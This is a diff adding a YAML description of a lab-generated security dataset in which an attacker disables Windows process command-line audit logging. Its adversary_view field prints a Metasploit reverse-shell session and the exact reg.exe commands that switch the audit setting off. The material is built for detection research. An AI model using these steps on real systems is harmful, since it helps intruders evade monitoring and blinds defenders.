@@ -1,0 +1,75 @@
+title: Disabling Process Command Line Logging via Registry Modification
+id: SDWIN-220703123711
+contributors:
+- Jose Rodriguez @Cyb3rPandaH
+creation_date: 2022/07/03
+modification_date: 2022/07/05
+platform:
+- Windows
+type: atomic
+tags:
+- reg
+- cmd
+- microsoft windows security auditing
+description: |-
+  After getting a shell with elevated privileges on the target, we used reg.exe to modify the HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit registry key.
+  
+  Logging of command line in process creation events for Microsoft Windows Security Auditing was disabled by changing the registry value data from 1 to 0 in the ProcessCreationIncludeCmdLine_Enabled registry value.
+
+  This dataset was generated using a Windows 10 Enterprise Evaluation edition (Version:21H1,OS Build:19043.1766) and Kali Linux (Version:2021.3).
+attack_mappings:
+  - technique: T1562
+    sub-technique: "002"
+    tactics:
+      - TA0005
+notebooks:
+files:
+- type: Host
+  link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/cmd_reg_disable_process_command_line_logging.zip
+simulation:
+  environment: Lab VM
+  tools:
+    - type: Manual
+      name: cmd
+      module: cmd
+      script:
+  permissions_required:
+    - Administrator
+  adversary_view: |-
+    msf6 exploit(multi/handler) > run
+    
+    [*] Started HTTPS reverse handler on https://10.0.10.104:8443
+    [*] https://10.0.10.104:8443 handling request from 10.0.10.102; (UUID: byflrtg7) Staging x64 payload (201308 bytes) ...
+    [*] Meterpreter session 1 opened (10.0.10.104:8443 -> 127.0.0.1) at 2022-07-03 12:37:11 -0400
+    
+    meterpreter > shell
+    Process 5836 created.                                                                                                                        
+    Channel 1 created.                                                                                                                           
+    Microsoft Windows [Version 10.0.19043.1766]
+    (c) Microsoft Corporation. All rights reserved.
+    
+    C:\Users\pedro\Downloads>REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit /s
+    REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit /s
+    
+    HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit
+        ProcessCreationIncludeCmdLine_Enabled    REG_DWORD    0x1
+    
+    
+    C:\Users\pedro\Downloads>REG ADD HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit /t REG_DWORD /v ProcessCreationIncludeCmdLine_Enabled /d 0
+    REG ADD HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit /t REG_DWORD /v ProcessCreationIncludeCmdLine_Enabled /d 0
+    Value ProcessCreationIncludeCmdLine_Enabled exists, overwrite(Yes/No)? yes
+    The operation completed successfully.
+    
+    C:\Users\pedro\Downloads>REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit /s
+    REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit /s
+    
+    HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit
+        ProcessCreationIncludeCmdLine_Enabled    REG_DWORD    0x0
+    
+    
+    C:\Users\pedro\Downloads>
+
+
+references:
+- https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-process-creation
+- https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/reg
